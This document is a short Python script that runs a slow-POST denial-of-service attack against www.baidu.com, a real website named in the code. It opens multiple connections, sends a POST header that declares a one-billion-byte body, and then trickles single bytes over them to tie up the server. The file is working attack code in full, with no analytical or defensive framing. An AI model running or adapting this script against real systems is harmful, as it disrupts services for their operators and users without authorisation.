#python3.6

import socket
import time
import threading

MAX_CONN=10
PORT=80
HOST="www.baidu.com"
PAGE="/"

data=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 1000000000\r\n"
"Cookie: ddos_test\r\n"
"\r\n" % (PAGE,HOST))

data2=data.encode('utf-8')

socks=[]

def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(data2)
            print("[+] Send data OK!,conn=%d\n" % i)
            socks.append(s)
        except:
            print ("[-] Could not connect to server or send error")
            time.sleep(5)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(b"f")
                print ("[+] send OK! %s"%s)
            except:
                print ("[-] send error\n")
                socks.remove(s)
                s.close()
        time.sleep(1)


conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()

